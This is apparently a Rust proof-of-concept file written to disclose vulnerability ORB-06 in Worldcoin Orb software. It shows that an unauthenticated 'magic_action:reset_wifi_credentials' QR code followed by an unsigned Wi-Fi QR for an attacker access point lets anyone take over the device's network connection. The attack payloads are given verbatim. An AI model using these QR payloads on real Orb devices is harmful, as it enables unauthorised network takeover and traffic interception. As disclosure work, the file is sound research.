//! PoC for ORB-06: the Orb's "magic" operator QR action and the Wi-Fi
//! provisioning QR are both plaintext and unauthenticated.
//!
//! `src/upstream/wifi.rs` and `src/upstream/mecard.rs` are copied verbatim from
//! worldcoin/orb-software `orb-connd/src/service/` at commit 2b4f54dd. The only
//! edits are import paths and swapping `color_eyre::Result` for
//! `Result<_, String>` so the files build outside the workspace; no parsing
//! logic was touched.
//!
//! The magic-QR regex below is reproduced verbatim from
//! worldcoin/orb-core `src/plans/qr_scan/operator.rs` (commit 9c8e1af), which
//! does not build standalone.

mod upstream;

use regex::Regex;
use upstream::wifi::Credentials;

/// Verbatim from orb-core `src/plans/qr_scan/operator.rs:11-22`.
fn magic_qr_regex() -> Regex {
    Regex::new(
        r"(?x)
        ^
        magic_action
        :
        (?P<magic_action>[\w]+)
        $
    ",
    )
    .expect("bad regex")
}

/// Verbatim dispatch from orb-core `src/plans/qr_scan/operator.rs:49-59`.
#[derive(Debug, PartialEq)]
enum MagicAction {
    ResetWifi,
    ResetMirror,
}

fn try_parse_magic(code: &str) -> Option<MagicAction> {
    let re = magic_qr_regex();
    let captures = re.captures(code)?;
    match captures
        .name("magic_action")
        .expect("magic_action group must be present")
        .as_str()
    {
        "reset_wifi_credentials" => Some(MagicAction::ResetWifi),
        "reset_mirror_calibration" => Some(MagicAction::ResetMirror),
        _ => None,
    }
}

fn main() {
    println!("=== ORB-06 PoC: unauthenticated Orb network takeover via QR ===\n");

    // ---- Step 1: the magic reset QR ----------------------------------------
    let step1 = "magic_action:reset_wifi_credentials";
    let action = try_parse_magic(step1);

    println!("step 1 — QR payload: {step1:?}");
    println!("         parsed as : {action:?}");
    assert_eq!(action, Some(MagicAction::ResetWifi));
    println!(
        "         => accepted. No signature, no MAC, no operator credential, no\n\
         \x20           nonce, no shared secret. The whole payload is a public\n\
         \x20           constant that appears in orb-core's own unit tests.\n"
    );

    // In orb-core this dispatches to Plan::reset_wifi_and_ensure_network()
    // (src/plans/mod.rs:998-1007) *before* verify_operator_qr_code() runs.

    // ---- Step 2: the attacker's Wi-Fi QR -----------------------------------
    let step2 = "WIFI:T:WPA;S:ORB-EVIL-AP;P:attackerpassword;;";
    let creds = Credentials::parse(step2).expect("attacker wifi QR should parse");

    println!("step 2 — QR payload: {step2:?}");
    println!("         parsed as : {creds:?}");
    assert_eq!(creds.ssid, "ORB-EVIL-AP");
    assert!(creds.psk.is_some());
    println!(
        "         => accepted. Standard MeCard Wi-Fi QR, also unsigned. The\n\
         \x20           signed NETCONFIG format exists (NetConfig::verify_signature)\n\
         \x20           but this path never invokes it.\n"
    );

    // ---- The guard that step 1 disables ------------------------------------
    println!("why step 1 matters:");
    println!(
        "  orb-connd `apply_wifi_qr` (service/dbus.rs:107-130) refuses unsigned\n\
         \x20 Wi-Fi QRs when the Orb already has connectivity:\n\
         \x20   can_apply_wifi_qr = has_no_connectivity || within_magic_qr_timespan\n\
         \x20 `apply_magic_reset_qr` (dbus.rs:279-281) sets magic_qr_applied_at = now,\n\
         \x20 opening MAGIC_QR_TIMESPAN_MIN = 10 minutes in which that guard is void.\n\
         \x20 It also wipes every saved profile, so has_no_connectivity becomes true\n\
         \x20 on its own. Either half of the disjunction is enough.\n"
    );

    // ---- Negative controls -------------------------------------------------
    assert_eq!(try_parse_magic("magic_action:burn_everything"), None);
    assert_eq!(try_parse_magic("random_text"), None);
    assert!(Credentials::parse("WIFI:T:WPA;P:nossid;;").is_err());
    println!("negative controls pass (unknown action rejected, SSID-less QR rejected)");

    println!("\nresult: two printed QR codes, no secrets, no prior access.");
}
